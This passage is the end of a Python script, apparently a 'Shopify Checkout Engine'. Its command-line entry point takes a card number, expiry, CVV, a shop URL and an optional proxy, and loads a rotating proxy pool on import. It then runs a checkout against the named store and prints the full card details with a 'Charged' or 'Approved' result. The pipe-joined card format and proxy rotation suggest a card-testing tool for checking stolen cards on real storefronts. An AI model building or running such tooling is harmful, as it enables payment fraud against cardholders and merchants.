    }


# ──────────────────────── Load pool on import ────────────────────────

_load_proxy_pool_from_env()


# ──────────────────────── CLI self-test ──────────────────────────────

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 6:
        print("Usage: python checkout_engine.py <card> <mm> <yyyy> <cvv> <shop_url> [proxy]")
        print(f"Version: {VERSION}")
        print(f"Stats:   {engine_stats()}")
        sys.exit(1)

    card = f"{sys.argv[1]}|{sys.argv[2]}|{sys.argv[3]}|{sys.argv[4]}"
    shop = sys.argv[5]
    proxy = sys.argv[6] if len(sys.argv) > 6 else ""

    print(f"\n{'=' * 60}")
    print(f"  Shopify Checkout Engine v{VERSION}")
    print(f"  Card:  {card}")
    print(f"  Site:  {shop}")
    print(f"  Proxy: {proxy or '(none)'}")
    print(f"{'=' * 60}\n")

    result = run_checkout_public(shop, card, proxy, True)

    print(f"{'=' * 60}")
    print(f"  Status:      {result.get('status')}")
    print(f"  Status Code: {result.get('status_code')}")
    print(f"  Message:     {result.get('message')}")
    print(f"  Price:       {result.get('price')} {result.get('currency', '')}")
    print(f"  Duration:    {result.get('duration_ms')}ms")
    if result.get('receipt_url'):
        print(f"  Receipt:     {result['receipt_url']}")
    if result.get('stage_timings'):
        print(f"  Stages:")
        for k, v in result['stage_timings'].items():
            print(f"    {k}: {v}ms")
    print(f"{'=' * 60}\n")

    sys.exit(0 if result.get("status") in ("Charged", "Approved") else 1)
